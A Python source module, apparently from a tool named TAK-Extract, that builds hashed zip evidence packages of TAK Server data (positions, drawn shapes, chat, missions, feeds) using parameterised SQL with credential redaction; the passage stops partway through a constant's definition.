"""
Export package generation for TAK-Extract.

Builds the same evidence package as the cot-export shell script: a set of
CSV files, a plain-language README, and SHA-256 hashes, delivered as a
single zip. Nothing is written to persistent storage - the package is
assembled in memory and streamed to the browser.
"""

import csv
import hashlib
import io
import re
import textwrap
import zipfile
from datetime import datetime, timedelta, timezone

import shapes


# ---------------------------------------------------------------------------
# Shared SQL fragments
# ---------------------------------------------------------------------------

# What an absent operator-supplied note renders as, in every file that
# carries one (the package README, the KMZ overview, parameters.txt).
# A fixed literal rather than a blank so the same query always produces
# the same bytes - see write_deterministic_zip_entry(); a package's hash
# is the entire basis of the Verify page. Defined here, not in kmz.py,
# because kmz.py imports this module at module level while this one can
# only import kmz lazily (build_package) to avoid the cycle.
NOT_RECORDED = "(not recorded)"


# Positions that are real: present, and not the "no fix" null island value.
REAL_POSITION = """
    event_pt IS NOT NULL
    AND NOT (ST_Y(event_pt) = 0 AND ST_X(event_pt) = 0)
"""


# The window/area filter shared by the record-count preview and the
# single-CSV export, so the number shown and the number exported come from
# identical criteria. REAL_POSITION above is the same two lines without the
# window and box; this spells them out in the order the parameters arrive.
# app.py aliases both of these, so the page code still reads POSITION_FILTER.
POSITION_FILTER = """
    servertime >= %s::timestamptz
    AND servertime <  %s::timestamptz
    AND event_pt IS NOT NULL
    AND NOT (ST_Y(event_pt) = 0 AND ST_X(event_pt) = 0)
    AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326)
    AND cot_type <> 'b-t-f'
"""


def filter_args(p):
    return (p["start"], p["end"], p["west"], p["south"], p["east"], p["north"])


def single_csv_sql(chan_and):
    """The positional query used by /api/locations. A function rather than a
    module-level constant because the channel clause is only known per
    request - `chan_and` is "" (no filter) or an "AND (...)" fragment from
    channel_where_clause."""
    return f"""
        SELECT r.id,
               r."time"                                    AS event_time,
               r.servertime,
               ST_Y(r.event_pt)                            AS latitude,
               ST_X(r.event_pt)                            AS longitude,
               r.uid,
               substring(r.detail from '<contact[^>]*callsign="([^"]*)"')   AS callsign,
               r.point_ce                                  AS ce_m,
               r.how,
               r.cot_type,
               substring(r.detail from '<precisionlocation[^>]*geopointsrc="([^"]*)"')
                                                           AS geopoint_src,
               {channel_names('r.groups')}                        AS channels,
               substring(r.detail from '<__group[^>]*name="([^"]*)"')      AS reported_team,
               substring(r.detail from '<__group[^>]*role="([^"]*)"')      AS reported_role,
               substring(r.detail from '<track[^>]*course="([^"]*)"')      AS course_deg,
               substring(r.detail from '<track[^>]*speed="([^"]*)"')       AS speed_ms,
               r.point_hae                                 AS hae_m,
               r.point_le                                  AS le_m,
               r."start"                                   AS event_start,
               r.stale,
               substring(r.detail from '<status[^>]*battery="([^"]*)"')    AS battery_pct,
               substring(r.detail from '<takv[^>]*device="([^"]*)"')       AS device_model,
               substring(r.detail from '<takv[^>]*platform="([^"]*)"')     AS tak_platform,
               substring(r.detail from '<takv[^>]*version="([^"]*)"')      AS tak_version,
               substring(r.detail from '<remarks[^>]*>([^<]*)</remarks>')  AS remarks,
               r.access, r.opex, r.caveat, r.releaseableto,
               r.detail                                    AS raw_detail
        FROM cot_router r
        WHERE {POSITION_FILTER}
          {chan_and}
        ORDER BY r.uid, r.servertime;
    """


def count_sql(chan_and):
    """The /api/count preview. Built from COT_CATEGORIES / MAP_OBJECT_PATTERNS
    - the same patterns cot_category() uses for KMZ folders, so this preview
    cannot disagree with the actual export. Patterns are Python constants,
    not user input, so embedding them as literal SQL is safe; the doubled
    '%' is only because psycopg2 reads a bare '%' as its own placeholder."""
    category_filters = ",\n            ".join(
        f"""count(DISTINCT uid) FILTER (WHERE cot_type LIKE '{pat.replace("%", "%%")}')"""
        for _label, pat in COT_CATEGORIES
    )
    map_object_filter = " OR ".join(
        f"""cot_type LIKE '{pat.replace("%", "%%")}'"""
        for pat in MAP_OBJECT_PATTERNS
    )
    return f"""
        SELECT
            count(*),
            count(DISTINCT uid),
            {category_filters},
            count(DISTINCT uid) FILTER (WHERE {map_object_filter})
        FROM cot_router
        WHERE {POSITION_FILTER}
          {chan_and};
    """


# cot_type classification, as SQL LIKE patterns (% wildcards only) - the
# single source of truth for "which kind of thing is this". Read by both
# app.py's /api/count (as a literal SQL LIKE clause) and cot_category()
# below (as a Python regex), so the record-count preview and the actual
# export can't silently disagree about what counts as what.
COT_CATEGORIES = [
    ("Personnel",              "a-%-G-U-%"),
    ("Vehicles and equipment", "a-%-G-E-%"),
    ("Infrastructure",         "a-%-G-I%"),
]

# A separate list rather than folded into COT_CATEGORIES: this one is an OR
# of two unrelated prefixes (user-drawn shapes and dropped markers), not a
# single pattern, so it doesn't fit the one-row-per-category shape above.
MAP_OBJECT_PATTERNS = ["u-d-%", "b-m-%"]


def _like_to_regex(pattern):
    """Translate a simple SQL LIKE pattern (% wildcards only, no _) into a
    compiled regex, so Python code can classify a value with the exact same
    pattern a SQL LIKE clause uses - one definition, two interpreters,
    rather than a second hand-written copy that could drift from the first."""
    return re.compile("^" + ".*".join(re.escape(part) for part in pattern.split("%")) + "$")


_CATEGORY_MATCHERS = [(label, _like_to_regex(pat)) for label, pat in COT_CATEGORIES]
_MAP_OBJECT_MATCHERS = [_like_to_regex(pat) for pat in MAP_OBJECT_PATTERNS]


def cot_category(cot_type):
    """Which category a cot_type falls into: one of COT_CATEGORIES' labels,
    "Map objects", or None if it matches none of them. Used by kmz.py to
    sort devices into folders, with the same patterns /api/count uses for
    the record-count preview."""
    if not cot_type:
        return None
    for label, rx in _CATEGORY_MATCHERS:
        if rx.match(cot_type):
            return label
    for rx in _MAP_OBJECT_MATCHERS:
        if rx.match(cot_type):
            return "Map objects"
    return None

# Decodes the channel bitmask to names. VERIFIED against a live server: the
# mask is read from the RIGHT, so bitpos = length(groups) - i.
#
# Iterates over the small `groups` table (one row per real channel) and
# probes only those specific bit positions, rather than walking every
# position the column could possibly hold. That distinction matters a lot
# in practice: on a real server, `length(groups)` turned out to be ~32768
# bits (TAK Server pre-allocates the mask at a fixed size, not one bit per
# actual channel), so the previous generate_series(1, length(col)) version
# was checking ~32768 positions per row to find the ~1-2 that were ever
# set - confirmed via EXPLAIN ANALYZE against a real install to be
# responsible for essentially all of a 145+ second KMZ export (17,022
# rows x ~24.5ms each). This version costs one substring check per real
# channel (dozens, not tens of thousands) per row instead.
def channel_names(col):
    return f"""(SELECT string_agg(gg.name, ', ' ORDER BY gg.bitpos)
                FROM groups gg
                WHERE gg.bitpos < length({col})
                  AND substring({col} from (length({col}) - gg.bitpos) for 1) = B'1')"""


def channel_numbers(col):
    return f"""(SELECT string_agg(gg.bitpos::text, ',' ORDER BY gg.bitpos)
                FROM groups gg
                WHERE gg.bitpos < length({col})
                  AND substring({col} from (length({col}) - gg.bitpos) for 1) = B'1')"""


def channel_where_clause(col, channels, prefix="WHERE"):
    """A boolean SQL condition restricting rows to those on at least one of
    the given channels, using the same right-indexed bitpos convention as
    channel_names()/channel_numbers().

    channels: None means no filter - the default - and returns ("", [])
    so callers can splice in nothing at all. An empty collection is an
    operator's deliberate "no channels selected", which must match zero
    rows rather than silently behaving like "no filter" (subtractive
    filtering only works if excluding everything is actually honored).

    Returns (clause_with_prefix_or_empty_string, params_list). Multiple
    selected channels are OR'd together - a row matches if it carries ANY
    of them, not all.
    """
    if channels is None:
        return "", []
    if not channels:
        return f"{prefix} FALSE", []
    conditions = " OR ".join(
        f"substring({col} from (length({col}) - %s) for 1) = B'1'"
        for _ in channels
    )
    return f"{prefix} ({conditions})", list(channels)


# The optional files whose source table actually carries a channel (a
# `groups` bitmask column). The rest (mission-changes, mission-subs,
# mission-contents, attachments, federation) have no channel of their own,
# so the filter can't apply to them - disclosed in the README rather than
# silently doing nothing.
# Files whose rows are not a direct query result (see app.py's /api/preview
# and /api/optional-files): a LIMIT 5 of the underlying SQL would not
# resemble the file, so the Export page shows no Preview button for them.
NON_PREVIEWABLE_FILES = {"shapes.csv"}

CHANNEL_FILTERABLE_FILES = {
    "cot.csv", "shapes.csv", "connections.csv", "chat.csv", "missions.csv",
    "files.csv", "video.csv", "datafeeds.csv",
}


# ---------------------------------------------------------------------------
# Track/segment helpers - shared by kmz.py (per-device track folders) and
# app.py's /api/trails (map-preview motion lines), both of which need to
# break a device's points wherever it stopped reporting for a while rather
# than drawing a straight line through a gap it may not have travelled.
# ---------------------------------------------------------------------------

# A device that has not reported for longer than this is treated as a gap,
# and the track is broken rather than interpolated across it.
GAP_SECONDS = 300


def split_segments(points):
    """Break a device's points (each a dict with a "servertime" key, in
    chronological order) wherever it stopped reporting for more than
    GAP_SECONDS. Returns a list of point-lists."""
    segments = []
    current = []
    previous_time = None

    for p in points:
        t = p["servertime"]
        if previous_time is not None and t is not None:
            if (t - previous_time) > timedelta(seconds=GAP_SECONDS):
                if current:
                    segments.append(current)
                current = []
        current.append(p)
        previous_time = t

    if current:
        segments.append(current)
    return segments


# ---------------------------------------------------------------------------
# Zip helper - shared by kmz.py's own doc.kml/parameters.txt zip and this
# module's outer package zip.
# ---------------------------------------------------------------------------

def write_deterministic_zip_entry(zf, name, data):
    """zipfile.ZipFile.writestr(name, data), but with a fixed entry
    timestamp instead of the wall-clock moment this happens to run at.

    Without this, two exports of IDENTICAL underlying content (same rows,
    same params) produce DIFFERENT bytes and DIFFERENT SHA-256 hashes,
    purely because writestr()'s default path stamps each entry with
    time.localtime(time.time()) - confirmed by reproducing it directly
    (zipping the same content twice, a couple seconds apart, yields two
    different hashes). That's exactly backwards for a tool whose whole
    point is proving a file's integrity via its hash: the bundled
    locations.kmz inside a full package and a separately-downloaded
    standalone locations.kmz, built from the identical query result,
    should hash identically too - not merely contain the same bytes of
    KML, but BE the same bytes, full stop. 1980-01-01 is the standard
    "no real timestamp" sentinel zip tooling uses for exactly this
    (the format's own minimum valid date), not a claim about when
    anything was actually generated - the real generation time is
    already recorded properly in the audit log and in parameters.txt/
    README's own content.
    """
    info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    zf.writestr(info, data)


# ---------------------------------------------------------------------------
# Query definitions
#
# Each entry: filename, description for the README, the SQL, and how many
# of the standard parameters it needs. Parameters are always supplied in
# the order (start, end, west, south, east, north).
# ---------------------------------------------------------------------------

def build_queries(p, channels=None, included=None):
    """Return the list of (filename, sql, params) making up a package.

    p: the validated time-window/bounding-box params (see app.py's
    parse_params). Every query resolves its own parameter tuple from these
    plus `channels` right here, next to its own SQL, rather than through a
    separate lookup - keeps each query's params from drifting out of
    positional sync with its placeholders.

    channels: None means no channel filter (every channel - the default).
    A collection of channel bitpos values restricts CHANNEL_FILTERABLE_FILES
    to rows carrying at least one of them; an empty collection is an
    operator's deliberate "no channels selected" and matches zero rows (see
    channel_where_clause). Files whose source table has no channel of its
    own (mission-changes, mission-subs, mission-contents, attachments,
    federation) are unaffected either way - the filter can't apply to what
    isn't there, and that's disclosed in the README rather than silently
    doing nothing. manifest.csv is handled separately below: it reports on
    channel exclusion rather than being narrowed by it, the same way it
    already reports on geographic exclusion without being geo-filtered.

    included: None means every file (the default - unchanged behaviour). A
    collection of filenames means only those optional files plus
    manifest.csv, which is never optional - a query for anything outside
    that set is not returned at all, so the caller never runs it.
    """
    start, end = p["start"], p["end"]
    west, south, east, north = p["west"], p["south"], p["east"], p["north"]

    chan_and, chan_params = channel_where_clause("r.groups", channels, prefix="AND")
    positions = f"""
        SELECT r.id,
               r."time"       AS event_time,
               r.servertime,
               ST_Y(r.event_pt) AS latitude,
               ST_X(r.event_pt) AS longitude,
               r.uid,
               substring(r.detail from '<contact[^>]*callsign="([^"]*)"') AS callsign,
               r.point_ce     AS ce_m,
               r.how,
               r.cot_type,
               substring(r.detail from '<precisionlocation[^>]*geopointsrc="([^"]*)"')
                              AS geopoint_src,
               {channel_names('r.groups')}   AS channels,
               {channel_numbers('r.groups')} AS channel_numbers,
               substring(r.detail from '<__group[^>]*name="([^"]*)"') AS reported_team,
               substring(r.detail from '<__group[^>]*role="([^"]*)"') AS reported_role,
               substring(r.detail from '<track[^>]*course="([^"]*)"') AS course_deg,
               substring(r.detail from '<track[^>]*speed="([^"]*)"')  AS speed_ms,
               r.point_hae    AS hae_m,
               r.point_le     AS le_m,
               r."start"      AS event_start,
               r.stale,
               substring(r.detail from '<status[^>]*battery="([^"]*)"') AS battery_pct,
               substring(r.detail from '<takv[^>]*device="([^"]*)"')   AS device_model,
               substring(r.detail from '<takv[^>]*platform="([^"]*)"') AS tak_platform,
               substring(r.detail from '<takv[^>]*version="([^"]*)"')  AS tak_version,
               substring(r.detail from '<remarks[^>]*>([^<]*)</remarks>') AS remarks,
               (SELECT string_agg(DISTINCT d.name, ', ')
                FROM data_feed_cot dfc JOIN data_feed d ON d.id = dfc.data_feed_id
                WHERE dfc.cot_router_id = r.id)          AS data_feed_names,
               (SELECT count(*) FROM cot_image ci WHERE ci.cot_id = r.id)
                                                          AS attached_images,
               r.access, r.opex, r.caveat, r.releaseableto,
               r.detail       AS raw_detail
        FROM cot_router r
        WHERE servertime >= %s::timestamptz
          AND servertime <  %s::timestamptz
          AND {REAL_POSITION}
          AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326)
          AND cot_type <> 'b-t-f'
          {chan_and}
        ORDER BY r.uid, r.servertime
    """
    positions_params = (start, end, west, south, east, north, *chan_params)

    # Drawn map objects (fire lines, perimeters, circles, dropped points):
    # every version of each one in the window, channel-filtered exactly as
    # cot.csv is, but deliberately NOT filtered by the box here. The
    # database only indexes one anchor point per row (event_pt), which for
    # a shape is its centroid or first vertex - so a fire line crossing the
    # box whose anchor fell outside it would be dropped. The real vertices
    # are inside `detail`, which SQL can't test spatially, so the box test
    # is applied afterwards in Python (shapes.build_rows), against the
    # actual geometry. Also no REAL_POSITION clause: a polygon's vertices
    # are its geometry, whether or not the anchor row is at (0,0).
    shape_type_clause = " OR ".join("cot_type LIKE %s" for _ in MAP_OBJECT_PATTERNS)
    shape_versions = f"""
        SELECT r.id, r.uid, r.servertime, r."time" AS event_time, r.cot_type, r.how,
               substring(r.detail from '<contact[^>]*callsign="([^"]*)"') AS callsign,
               ST_Y(r.event_pt) AS latitude, ST_X(r.event_pt) AS longitude,
               {channel_names('r.groups')}   AS channels,
               {channel_numbers('r.groups')} AS channel_numbers,
               r.detail AS raw_detail
        FROM cot_router r
        WHERE servertime >= %s::timestamptz
          AND servertime <  %s::timestamptz
          AND ({shape_type_clause})
          {chan_and}
        ORDER BY r.uid, r.servertime, r.id
    """
    shape_versions_params = (start, end, *MAP_OBJECT_PATTERNS, *chan_params)

    # The manifest's universe - which UIDs were active at all - is time-
    # filtered ONLY: no bounding box, no position filter, no channel filter.
    # It exists so every device active in the window is accounted for,
    # whether or not it made the main file. events_exported and
    # exclusion_reason DO reflect the bounding box and the channel filter -
    # the same way the manifest already explains a geographic exclusion, it
    # now explains a channel exclusion too - but the roster of UIDs itself
    # never shrinks because of either one.
    manifest_chan_and, manifest_chan_params = channel_where_clause(
        "groups", channels, prefix="AND"
    )
    manifest = f"""
        SELECT uid,
               CASE WHEN cot_type_list LIKE 'a-%%' THEN 'device/entity'
                    ELSE 'message or object' END AS uid_kind,
               total_events, events_with_position, events_at_0_0,
               events_no_geometry, events_inside_box, events_exported,
               CASE WHEN events_exported > 0 THEN 'yes' ELSE 'no' END
                    AS in_positional_export,
               CASE WHEN events_exported > 0 THEN 'included'
                    WHEN events_with_position = 0 AND events_at_0_0 > 0
                         THEN 'no valid GPS fix (0,0)'
                    WHEN events_with_position = 0
                         THEN 'no position data in these events'
                    WHEN events_inside_box = 0
                         THEN 'had positions, none inside the bounding box'
                    ELSE 'inside the bounding box, but not on a selected channel'
                    END AS exclusion_reason,
               first_event, last_event,
               cot_type_list AS cot_types_seen, callsign_seen
        FROM (
            SELECT uid,
                   count(*) AS total_events,
                   count(*) FILTER (WHERE {REAL_POSITION}) AS events_with_position,
                   count(*) FILTER (WHERE event_pt IS NOT NULL
                              AND ST_Y(event_pt) = 0 AND ST_X(event_pt) = 0)
                       AS events_at_0_0,
                   count(*) FILTER (WHERE event_pt IS NULL) AS events_no_geometry,
                   count(*) FILTER (WHERE {REAL_POSITION}
                              AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326))
                       AS events_inside_box,
                   count(*) FILTER (WHERE {REAL_POSITION}
                              AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326)
                              {manifest_chan_and})
                       AS events_exported,
                   min(servertime) AS first_event,
                   max(servertime) AS last_event,
                   string_agg(DISTINCT cot_type, ' ' ORDER BY cot_type) AS cot_type_list,
                   string_agg(DISTINCT
                       substring(detail from '<contact[^>]*callsign="([^"]*)"'), ' ')
                       AS callsign_seen
            FROM cot_router
            WHERE servertime >= %s::timestamptz
              AND servertime <  %s::timestamptz
            GROUP BY uid
        ) s
        ORDER BY events_exported DESC, total_events DESC
    """
    manifest_params = (
        west, south, east, north,
        west, south, east, north, *manifest_chan_params,
        start, end,
    )

    connections_chan_and, connections_chan_params = channel_where_clause(
        "cee.groups", channels, prefix="AND"
    )
    connections = f"""
        SELECT cee.created_ts, cet.event_name, ce.uid, ce.callsign,
               ce.username, ce.team, ce.role, cee.client_version,
               {channel_names('cee.groups')}   AS channels,
               {channel_numbers('cee.groups')} AS channel_numbers
        FROM client_endpoint_event cee
        JOIN client_endpoint ce        ON ce.id  = cee.client_endpoint_id
        JOIN connection_event_type cet ON cet.id = cee.connection_event_type_id
        WHERE cee.created_ts >= %s::timestamptz
          AND cee.created_ts <  %s::timestamptz
          {connections_chan_and}
        ORDER BY cee.created_ts
    """
    connections_params = (start, end, *connections_chan_params)

    chat_chan_and, chat_chan_params = channel_where_clause("c.groups", channels, prefix="AND")
    chat = f"""
        SELECT c.id, c."time" AS event_time, c.servertime,
               c.sender_callsign, c.dest_callsign, c.chat_room, c.chat_content,
               c.uid AS sender_uid, c.dest_uid,
               ST_Y(c.event_pt) AS latitude, ST_X(c.event_pt) AS longitude,
               c.cot_type, c.how,
               {channel_names('c.groups')}   AS channels,
               {channel_numbers('c.groups')} AS channel_numbers,
               c.access, c.opex, c.detail AS raw_detail
        FROM cot_router_chat c
        WHERE c.servertime >= %s::timestamptz
          AND c.servertime <  %s::timestamptz
          {chat_chan_and}
        ORDER BY c.servertime
    """
    chat_params = (start, end, *chat_chan_params)

    missions_chan_where, missions_chan_params = channel_where_clause(
        "m.groups", channels, prefix="WHERE"
    )
    missions = f"""
        SELECT m.id, m.guid, m.name, m.description, m.creatoruid, m.create_time,
               m.last_edited, m.tool, m.chatroom, m.classification, m.bbox,
               m.bounding_polygon, m.base_layer, m.path, m.parent_mission_id,
               m.invite_only, m.expiration,
               {channel_names('m.groups')}   AS channels,
               {channel_numbers('m.groups')} AS channel_numbers,
               CASE WHEN m.password_hash IS NULL THEN 'no' ELSE 'yes' END
                   AS password_protected
        FROM mission m
        {missions_chan_where}
        ORDER BY m.create_time
    """
    missions_params = tuple(missions_chan_params)

    mission_changes = """
        SELECT id, ts, servertime, mission_name, mission_guid, mission_id,
               change_type,
               CASE change_type
                    WHEN 0 THEN 'CREATE_MISSION'
                    WHEN 1 THEN 'DELETE_MISSION'
                    WHEN 2 THEN 'ADD_CONTENT'
                    WHEN 3 THEN 'REMOVE_CONTENT'
                    WHEN 4 THEN 'CREATE_DATA_FEED'
                    WHEN 5 THEN 'DELETE_DATA_FEED'
                    ELSE 'unknown code'
               END AS change_type_name,
               uid, creatoruid, hash,
               external_data_name, external_data_uid, external_data_tool,
               external_data_notes, mission_feed_uid, map_layer_uid,
               remote_federated_change, xml_content_for_notification
        FROM mission_change
        WHERE ts >= %s::timestamptz AND ts < %s::timestamptz
        ORDER BY ts
    """
    mission_changes_params = (start, end)

    mission_subs = """
        SELECT ms.mission_id, m.name AS mission_name, ms.client_uid, ms.uid,
               ms.username, ms.create_time, ms.role_id
        FROM mission_subscription ms
        LEFT JOIN mission m ON m.id = ms.mission_id
        ORDER BY ms.create_time
    """
    mission_subs_params = ()

    mission_contents = """
        SELECT 'map item (mission_uid)' AS record_kind,
               mu.mission_id, m.name AS mission_name,
               mu.uid AS item_ref, NULL::text AS item_name,
               NULL::text AS notes, NULL::text AS url_display
        FROM mission_uid mu LEFT JOIN mission m ON m.id = mu.mission_id
        UNION ALL
        SELECT 'attached file (mission_resource)',
               mr.mission_id, m.name, mr.resource_hash, r.filename, r.mimetype, NULL
        FROM mission_resource mr
        LEFT JOIN mission m  ON m.id = mr.mission_id
        LEFT JOIN resource r ON r.id = mr.resource_id
        UNION ALL
        SELECT 'external data feed',
               med.mission_id, m.name, med.id, med.name, med.notes, med.url_display
        FROM mission_external_data med
        LEFT JOIN mission m ON m.id = med.mission_id
        ORDER BY 1, 2
    """
    mission_contents_params = ()

    files_chan_where, files_chan_params = channel_where_clause(
        "res.groups", channels, prefix="WHERE"
    )
    files = f"""
        SELECT res.id, res.uid, res.name, res.filename, res.mimetype,
               length(res.data) AS size_bytes, res.hash, res.submitter,
               res.creatoruid, res.submissiontime, res.tool,
               ST_Y(res.location) AS latitude, ST_X(res.location) AS longitude,
               res.altitude, res.remarks,
               array_to_string(res.keywords, ' ')    AS keywords,
               array_to_string(res.permissions, ' ') AS permissions,
               res.expiration,
               {channel_names('res.groups')}   AS channels,
               {channel_numbers('res.groups')} AS channel_numbers
        FROM resource res
        {files_chan_where}
        ORDER BY res.submissiontime
    """
    files_params = tuple(files_chan_params)

    attachments = """
        SELECT 'image' AS attachment_kind, ci.id AS attachment_id, ci.cot_id,
               length(ci.image) AS size_bytes, r.uid, r.cot_type, r.servertime
        FROM cot_image ci JOIN cot_router r ON r.id = ci.cot_id
        UNION ALL
        SELECT 'link', cl.id, cl.containing_event, NULL,
               r.uid, r.cot_type, r.servertime
        FROM cot_link cl JOIN cot_router r ON r.id = cl.containing_event
        ORDER BY 7
    """
    attachments_params = ()

    # Camera stream URLs commonly embed user:password. Those are replaced,
    # and the substitution is disclosed in the README.
    video_chan_where, video_chan_params = channel_where_clause(
        "v.groups", channels, prefix="WHERE"
    )
    video = f"""
        SELECT v.id, v.created, v.deleted, v.alias, v.owner, v.uuid, v.type,
               v.latitude, v.longitude, v.heading, v.fov, v.range,
               regexp_replace(v.url, '://[^/@]*@', '://[CREDENTIALS-REDACTED]@')
                   AS url,
               {channel_names('v.groups')}   AS channels,
               {channel_numbers('v.groups')} AS channel_numbers,
               regexp_replace(v.xml, '://[^/@<"]*@', '://[CREDENTIALS-REDACTED]@', 'g')
                   AS raw_xml
        FROM video_connections v
        {video_chan_where}
        ORDER BY v.created
    """
    video_params = tuple(video_chan_params)

    # The stored auth secret is deliberately not selected.
    datafeeds_chan_where, datafeeds_chan_params = channel_where_clause(
        "d.groups", channels, prefix="WHERE"
    )
    datafeeds = f"""
        SELECT d.id, d.uuid, d.name, d.type, dt.feed_type AS type_name,
               d.protocol, d.port, d.iface, d.archive, d.archive_only, d.sync,
               d.anongroup, d.auth_required, d.auth_type, d.federated,
               d.feed_group, d.data_source_endpoint, d.predicate_lang, d.predicate,
               d.sync_cache_retention_seconds,
               {channel_names('d.groups')}   AS channels,
               {channel_numbers('d.groups')} AS channel_numbers
        FROM data_feed d
        LEFT JOIN data_feed_type_pl dt ON dt.id = d.type
        {datafeeds_chan_where}
        ORDER BY d.id
    """
    datafeeds_params = tuple(datafeeds_chan_params)

    federation = """
        SELECT f.fed_id, f.fed_name, f.event_kind_id, k.event_kind,
               f.event_time, f.remote, f.details
        FROM fed_event f
        LEFT JOIN fed_event_kind_pl k ON k.id = f.event_kind_id
        ORDER BY f.event_time
    """
    federation_params = ()

    all_queries = [
        ("cot.csv",              positions,        positions_params),
        ("shapes.csv",           shape_versions,   shape_versions_params),
        ("manifest.csv",         manifest,         manifest_params),
        ("connections.csv",      connections,      connections_params),
        ("chat.csv",             chat,             chat_params),
        ("missions.csv",         missions,         missions_params),
        ("mission-changes.csv",  mission_changes,  mission_changes_params),
        ("mission-subs.csv",     mission_subs,     mission_subs_params),
        ("mission-contents.csv", mission_contents, mission_contents_params),
        ("files.csv",            files,            files_params),
        ("attachments.csv",      attachments,      attachments_params),
        ("video.csv",            video,            video_params),
        ("datafeeds.csv",        datafeeds,        datafeeds_params),
        ("federation.csv",       federation,       federation_params),
    ]
    if included is None:
        return all_queries
    return [q for q in all_queries if q[0] == "manifest.csv" or q[0] in included]


# The optional files in the full evidence package. Single source of truth for
# filenames and human labels, shared by build_queries() (decides what gets
# queried), build_readme() (discloses what was excluded and why), and
# app.py's /api/optional-files (feeds the checkbox UI) - so a label can't
# drift out of sync between the README and what the operator sees on screen.
#
# manifest.csv, README.txt and SHA256SUMS.txt are NOT here: manifest.csv is
# the accountability record (see NOTES.md - "do not weaken it") and the
# other two are the package wrapper itself. None of the three are optional.
OPTIONAL_FILES = {
    "cot.csv":              "Positions",
    "shapes.csv":           "Drawn shapes",
    "connections.csv":      "Connection / disconnection events",
    "chat.csv":              "Chat messages",
    "missions.csv":          "Missions",
    "mission-changes.csv":   "Mission edit history",
    "mission-subs.csv":      "Mission subscriptions",
    "mission-contents.csv":  "Mission contents",
    "files.csv":             "Shared file inventory",
    "attachments.csv":       "Attachments",
    "video.csv":             "Video feed references",
    "datafeeds.csv":         "Data feed configuration",
    "federation.csv":        "Federation records",
}


# Short, UI-facing text for each optional file's "About" popover - three
# scannable lines (what it contains, what narrows it down, and a privacy
# note when one applies) rather than paragraphs, so an operator can take
# it in at a glance instead of reading prose. Not the README's long-form
# paragraphs (build_readme's `descriptions` dict) - that's deliberately a
# separate, longer copy. `note` is optional/omittable, same as the old
# `risk` field was. `channel_filterable` mirrors CHANNEL_FILTERABLE_FILES
# so the frontend can say so without a second lookup.
FILE_INFO = {
    "cot.csv": {
        "contains": "One row per position report - who, where, and when.",
        "narrowed_by": "time window, area, and channel selection.",
        "note": "The most sensitive file here — real location history for named "
                "individuals. Also included as locations.kmz (the same rows, as a map).",
    },
    "connections.csv": {
        "contains": "When each device connected and disconnected.",
        "narrowed_by": "time window and channel selection (not area).",
        "note": "Shows presence patterns even for devices that never reported a usable position.",
    },
    "chat.csv": {
        "contains": "Chat messages, in full.",
        "narrowed_by": "time window and channel selection (not area).",
        "note": "Full message content — may include sensitive chatter unrelated to this incident.",
    },
    "missions.csv": {
        "contains": "Mission (shared workspace) definitions - names and descriptions.",
        "narrowed_by": "channel selection only (not time or area).",
        "note": "Names/descriptions may reference other operations, since missions "
                "aren't scoped to this incident's time window.",
    },
    "shapes.csv": {
        "contains": "Drawn map objects - fire lines, perimeters, circles, dropped "
                    "points - as their actual geometry, one row per version, plus "
                    "a row for each deletion.",
        "narrowed_by": "time window, channel selection, and area - but by a wider "
                       "area rule than cot.csv: a shape is included if ANY part of "
                       "it touches the box, not only if its anchor point is inside.",
        "note": "Once any version of a shape touches the box, every version of it "
                "is included, so a shape that moved in or out replays coherently. "
                "Deletions carry the time but not who deleted - TAK Server does "
                "not record that.",
    },
    "mission-changes.csv": {
        "contains": "Edit history for missions during the selected time window.",
        "narrowed_by": "time window only (not area or channel).",
        "note": "change_type_name decodes the server's numeric change_type "
                "(ADD_CONTENT, REMOVE_CONTENT, ...), read from TAK Server's own "
                "source; the raw number is kept beside it.",
    },
    "mission-subs.csv": {
        "contains": "Who was subscribed to which mission, and since when.",
        "narrowed_by": "nothing — every subscription on the server is listed, whatever "
                       "time window or area you picked.",
        "note": "This is an access list — it reveals who could see a mission's contents, "
                "including for missions unrelated to this incident.",
    },
    "mission-contents.csv": {
        "contains": "Items attached to missions - map markers, files, external feeds.",
        "narrowed_by": "nothing — every mission's contents are listed, whatever time "
                       "window or area you picked.",
        "note": "Item names or notes could reference something unrelated to this incident.",
    },
    "files.csv": {
        "contains": "Inventory of files in the server's file store - name, size, type, "
                    "hash (not the file contents themselves).",
        "narrowed_by": "channel selection only — otherwise every file in the store is "
                       "listed, whatever time window you picked.",
        "note": "Filenames or paths can themselves reveal operation names or locations.",
    },
    "attachments.csv": {
        "contains": "Images and links attached to individual map events.",
        "narrowed_by": "nothing — every attachment is listed, whatever time window or "
                       "area you picked.",
        "note": "Filenames and sizes only, not the image data itself.",
    },
    "video.csv": {
        "contains": "Video feed references - camera names, positions, and stream URLs "
                    "(login credentials removed).",
        "narrowed_by": "channel selection only — otherwise every configured camera is listed.",
        "note": "Camera names sometimes describe their physical location or target address.",
    },
    "datafeeds.csv": {
        "contains": "Data feed configuration - name, endpoint, and type (credentials excluded).",
        "narrowed_by": "channel selection only — otherwise every configured feed is listed.",
        "note": "",
    },
    "federation.csv": {
        "contains": "Connection activity with other systems - connects/disconnects and "
                    "batch-send events (not individual messages).",
        "narrowed_by": "nothing — every federation event is listed, whatever time window "
                       "or area you picked.",
        "note": "Can't be traced to specific records — there's no link back to which "
                "positions or messages, if any, were in a given batch. Check the "
                "'remote' column rather than assuming presence means data left the building.",
    },
}


# Tables checked at export time so an empty file can be distinguished from
# a table nobody looked at.
CENSUS_TABLES = [
    ("cot_image",            "attached images"),
    ("cot_link",             "event links"),
    ("cot_thumbnail",        "thumbnails"),
    ("mission_uid",          "mission map items"),
    ("mission_log",          "mission logs"),
    ("mission_resource",     "mission files"),
    ("mission_external_data", "mission external data"),
    ("mission_invitation",   "mission invitations"),
    ("fed_event",            "federation records"),
    ("properties_uid",       "properties"),
    ("video_connections",    "video connections"),
    ("video_connections_v2", "video connections (v2)"),
    ("data_feed",            "configured data feeds"),
    ("data_feed_cot",        "feed linkage"),
    ("groups",               "channels defined"),
]


def census_count_sql(table):
    """The census statement for one table, so the schema check counts rows
    the same way an export's README census does."""
    return f"SELECT count(*) FROM {table};"


# The README's DATA QUALITY SUMMARY, all in a single pass. Eleven separate
# scans over a large positional set was the dominant cost in earlier versions.
QUALITY_CHECKS = [
